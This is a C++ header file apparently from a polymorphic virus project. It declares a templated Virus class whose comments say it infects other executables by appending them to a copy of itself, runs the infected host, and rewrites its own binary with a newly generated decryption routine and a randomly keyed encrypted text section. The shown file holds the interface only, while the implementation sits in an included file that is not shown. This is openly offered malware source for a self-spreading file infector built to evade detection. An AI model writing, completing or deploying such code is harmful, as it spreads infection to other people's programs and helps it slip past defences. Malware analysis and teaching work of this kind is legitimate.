#pragma once

#include <memory>
#include <string>
#include <type_traits>

#include "binary_editor.hpp"
#include "encryption.hpp"
#include "engine.hpp"
#include "filesystem.hpp"
#include "ocompiler.hpp"
#include "utils.hpp"

namespace poly {

    namespace impl {

        template <class T, typename... Args>
        using next_target_t =
            std::enable_if<std::is_same<decltype(std::declval<T>().next_target(
                                            std::declval<Args>()...)),
                                        poly::fs::path>::value,
                           decltype(std::declval<T>().next_target(
                               std::declval<Args>()...))>;

        template <class T, typename... Args>
        using supports_next_target = is_detected_t<next_target_t, T, Args...>;

        template <class T, typename... Args>
        using exec_t =
            decltype(std::declval<T>().exec(std::declval<Args>()...));

        template <class T, typename... Args>
        using supports_exec = is_detected_t<exec_t, T, Args...>;

        template <class T, typename... Args>
        using wait_t =
            decltype(std::declval<T>().wait(std::declval<Args>()...));

        template <class T, typename... Args>
        using supports_wait = is_detected_t<wait_t, T, Args...>;

        template <class T, typename... Args>
        using get_result_t = std::enable_if<
            std::is_same<decltype(std::declval<const T>().get_result(
                             std::declval<Args>()...)),
                         int>::value,
            decltype(std::declval<const T>().get_result(
                std::declval<Args>()...))>;

        template <class T, typename... Args>
        using supports_get_result = is_detected_t<get_result_t, T, Args...>;

    } // namespace impl

    /**
     * This class contains all the logic required to infect other binaries and
     * execute their code. This class can be customized with its template
     * parameters:
     * - the TargetSelectPolicy class template parameter defines how the next
     * binary to infect must be chosen. It must provide the following method:
     *      poly::fs::path next_target(poly::fs::path) noexcept
     * where the path of the program being executed is passed by argument. Its
     * result path is assumed to be a valid path which point to a file.
     * - the ExecPolicy class template parameter defines how an infected binary
     * must be executed. It must provide the following methods:
     *       void exec(const poly::fs::path &, int, char **const,
     *              char **const) noexcept
     *       void wait() noexcept
     *       int get_result() const noexcept
     * - the Cipher class template parameter is used for the encryption and
     * decryption. See PolymorphicEngine for its requirements.
     * - the Editor class template parameter is used for the querying and
     * modifications of the binary. See PolymorphicEngine for its requirements.
     * Default class is poly::OsBinaryEditor.
     * - the Compiler class template parameter is used for the generation of the
     * assembly code and its serialization. See PolymorphicEngine for its
     * requirements. Default class is poly::OCompiler.
     */
    template <class TargetSelectPolicy, class ExecPolicy, class Cipher,
              class Editor = OsBinaryEditor, class Compiler = poly::OCompiler>
    class Virus : private TargetSelectPolicy, private ExecPolicy {
      public:
        /**
         * Build a new Virus.
         * @param argc same parameter of main.
         * @param argv same parameter of main.
         * @param envp same parameter of main.
         * @returns nullptr if:
         * - argc is <= 0
         * - argv or envp are nullptr
         * - it is not possible to open this binary (argv[0]) in read mode
         * - argv[0] is not a well-formed executable
         * If none of these errors are met, a valid pointer will be returned.
         */
        static std::unique_ptr<
            Virus<TargetSelectPolicy, ExecPolicy, Cipher, Editor, Compiler>>
        build(int argc, char **argv, char **envp) noexcept;

        /**
         * Infect the next executable binary.
         * Infect the next executable binary by appending it to a copy of this
         * binary. If the target is not readable and writable this method will
         * fail.
         * @param target path of the specified target to infect. If is empty, it
         * will be retrieved calling TargetSelectPolicy::next_target(...).
         * Default is empty.
         * @return kNone if no error is raised.
         */
        Error infect_next(fs::path target = {}) noexcept;

        /**
         * Execute the target previously infected and attached to this binary.
         * It will be executed by calling ExecPolicy::exec(...).
         * This method will fail if:
         * - this binary is not readable and writable
         * - this binary doesn't have a target binary attached to it to be
         * executed
         * - the target is already being launched, but its execution is not
         * ended yet
         * @return kNone if no error is raised.
         */
        Error exec_attached_program() noexcept;

        /**
         * Wait until the end of the target execution. This method will fail if:
         * - the target execution was not previously launched
         * - this binary doesn't have an attached target to execute
         * If no error is raised a call to ExecPolicy::wait(...) will be
         * performed.
         * @return kNone if no error is raised.
         */
        Error wait_exec_end() noexcept;

        /**
         * Get the result code of the last execution by calling
         * ExecPolicy::get_result(...). If no execution was performed, it is up
         * to ExecPolicy::get_result(...) to decide what value to return.
         */
        inline int exec_result() const noexcept { return this->get_result(); }

        static const std::string kExecutableFileExtension;

      protected:
        Virus(int argc, char **argv, char **envp,
              std::size_t attached_file_size, std::size_t total_size,
              std::unique_ptr<BinaryEditor<Editor>> &&editor,
              Address real_entry_va) noexcept;

        /**
         * Check whether this is the first execution or not.
         */
        inline bool is_first_execution() const noexcept {
            return this->attached_file_size_ == 0;
        }

      private:
        static_assert(
            std::is_constructible<TargetSelectPolicy>::value,
            "The template parameter TargetSelectPolicy must have "
            "this constructor definition: TargetSelectPolicy() noexcept.");

        static_assert(
            impl::supports_next_target<TargetSelectPolicy,
                                       poly::fs::path>::value,
            "The template parameter TargetSelectPolicy must implement this "
            "method: poly::fs::path next_target(poly::fs::path) noexcept.");

        static_assert(std::is_constructible<ExecPolicy>::value,
                      "The template parameter ExecPolicy must have "
                      "this constructor definition: ExecPolicy() noexcept.");

        static_assert(
            impl::supports_exec<ExecPolicy, const poly::fs::path &, int,
                                char **const, char **const>::value,
            "The template parameter ExecPolicy must implement this "
            "method: void exec(const poly::fs::path &, int, char **const, char "
            "**const) noexcept.");

        static_assert(impl::supports_wait<ExecPolicy>::value,
                      "The template parameter ExecPolicy must implement this "
                      "method: void wait() noexcept.");

        static_assert(impl::supports_get_result<ExecPolicy>::value,
                      "The template parameter ExecPolicy must implement this "
                      "method: int get_result() const noexcept.");

        static_assert(std::is_base_of<BinaryEditor<Editor>, Editor>::value,
                      "The template parameter Editor must implement "
                      "BinaryEditor interface.");

        /**
         * Modify this binary generating a new decryption procedure and
         * encrypting the text section with a new random key.
         */
        void modify_binary() noexcept;

        bool write_modified_target(const fs::path &target,
                                   std::size_t target_size,
                                   bool only_attached = false) noexcept;

        static const std::string kNewSectionName;

        int argc_;
        char **argv_;
        char **envp_;
        std::size_t attached_file_size_;
        std::size_t total_size_;
        std::unique_ptr<BinaryEditor<Editor>> editor_;
        Address real_entry_va_;
        fs::path target_temp_path_;
    };

} // namespace poly

#include "virus.tpp"